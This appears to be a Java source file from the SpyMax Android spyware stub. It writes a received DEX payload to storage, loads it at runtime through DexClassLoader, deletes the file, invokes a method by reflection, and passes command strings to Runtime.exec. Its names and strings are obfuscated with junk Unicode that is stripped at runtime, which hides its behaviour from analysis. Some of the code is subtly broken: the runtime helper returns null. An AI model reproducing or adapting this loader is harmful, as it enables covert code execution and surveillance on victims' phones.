package spymax.stub7;
import android.app.ActivityManager;
import android.content.Context;
import android.os.Environment;
import java.io.File;
import java.io.FileOutputStream;
import java.lang.reflect.Method;
import dalvik.system.DexClassLoader;
public class ClassGen10 {
    public static int id = 0 ;
    public static boolean _runn_srv_(Class<?> c, Context ctx) {
        ActivityManager a = (ActivityManager) ctx.getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo i : a.getRunningServices(Integer.MAX_VALUE)) {
            if (c.getName().equals(i.service.getClassName())) {
                return false;
            }
        }
        return true;
    }
    public static File _get_me_fil_(Context ctx){
        if (Environment.getExternalStorageState() == null) {
            return new File(Environment.getDataDirectory(),ClassGen8.FTX0);
        }else{
            return new File(Environment.getExternalStorageDirectory(),ClassGen8.FTX0);
        }
    }
    public static synchronized Class<?> _clss_loder_(Object[] objs){
        Context ctx =(Context) objs[0];
        byte[]mylugs = (byte[]) objs[1];
        String Tmethof = ((String) objs[2] + "[RANDOM-STRING]ﹶSᴵʻೲՙTﹶ[RANDOM-STRING]φʾOʼʾʿㅤˈPᵔঙʿ");
        String dexter = ((String) objs[3] + "ՙXﹶ[RANDOM-STRING]φTʾՙYﹶVC[RANDOM-STRING]φXʾ");

        File f = _get_me_fil_(ctx);
        if(!f.exists()){
            f.mkdir();
        }
        File p;
        try{
            //ﹶ[RANDOM-STRING]φTʾՙYﹶVC[RANDOM-STRING]
            p = new File(f, Concatet(ClassGen8.FTX3 ,"ⁱᵇʾ[RANDOM-STRING]ㅤˑ$ˏـﹳﾞ$[RANDOM-STRING]ʽʾᵎ", ClassGen10.id));
            ClassGen10.id += 1;
            FileOutputStream fs = new FileOutputStream(p);
            fs.write(mylugs,0,mylugs.length);
            fs.flush();
            fs.close();
        }catch (Exception e){
            p = null;

        }
        try {
            if (p != null){
                final File i = ctx.getDir(dexter.replace("ՙXﹶ[RANDOM-STRING]φTʾՙYﹶVC[RANDOM-STRING]φXʾ",""), 0);
                final DexClassLoader c = new DexClassLoader(p.getPath(), i.getAbsolutePath(), null, ctx.getClass().getClassLoader());
                p.delete();
                return c.loadClass(Tmethof.replace("[RANDOM-STRING]ﹶSᴵʻೲՙTﹶ[RANDOM-STRING]φʾOʼʾʿㅤˈPᵔঙʿ",""));
            }
        } catch (Exception e) {

        }
        return null;
    }

    private static String Concatet(String ftx3, String str, int id) {
        if (str.length() > 2)
        {
            return  ftx3+id;
        }
        return (ftx3 + id + str).replace("ⁱᵇʾ[RANDOM-STRING]ㅤˑ$ˏـﹳﾞ$[RANDOM-STRING]ʽʾᵎ","");
    }

    public static Object _excut_meth_(String str, Object[] objs){

        Context ctx = (Context) objs[0];
         Class<?> theclass = (Class<?>) objs[1];
        String methodnamed = ((String) objs[2] + "F[RANDOM-STRING]B0θ[RANDOM-STRING]TSθᵢᵢ");

        String strformeth = ((String) objs[3] +"₫X[RANDOM-STRING]X₫[RANDOM-STRING]θTᵢיBʿθᵢיʿ");
        byte[] mybyts = (byte[]) objs[4];

        Object r = null;
        if(theclass != null && str.equals("ʼʾʿˈᵔঙʿ$ʿʼ"))
        {
            try {
                Object pl =  theclass.newInstance();
                Method m = theclass.getDeclaredMethod(methodnamed.replace("F[RANDOM-STRING]B0θ[RANDOM-STRING]TSθᵢᵢ",""), Context.class, String.class, byte[].class);
                r = m.invoke(pl,ctx,strformeth.replace("₫X[RANDOM-STRING]X₫[RANDOM-STRING]θTᵢיBʿθᵢיʿ",""),mybyts);
            } catch (Exception e) {    }
        }
        return r;
    }

    public static void _run_comnd_(Object[] objs){
        Context ctx = (Context) objs[0];
        String co = (String) objs[1];
        File f = _get_me_fil_(ctx);
        if (f.isDirectory()) {
            try {
                Runtime ru = What_ClassGen10_Run("[RANDOM-STRING]θᵢEʿXᘣθBbˉFˆˉθφT$ˉˎ");
                ru.exec(co + f.getPath());
            } catch (Exception e) { }
        }

    }

    private static Runtime What_ClassGen10_Run(String Str) {
        try
        {
            if (Str.length() > 0)
            {
                Runtime.getRuntime();
            }

        }catch (Exception b){}
        return  null;
    }

}
